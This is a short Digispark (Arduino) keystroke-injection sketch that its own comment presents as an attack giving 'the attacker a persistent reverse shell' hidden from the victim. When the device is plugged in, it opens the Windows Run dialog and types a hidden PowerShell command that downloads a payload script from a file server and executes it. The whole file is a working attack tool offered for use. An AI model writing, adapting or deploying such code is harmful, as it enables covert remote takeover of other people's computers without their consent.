/*
Using the payload provided, this script will grant the attacker a persistent reverse shell that only if the victim is tech savvy, then will they be able to find it.
*/
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2500);

  /* Download Reverse Shell Payload */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILE_SERVER]/payloads/payload.ps1');\""); // Download payload from fileserver and execute.
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
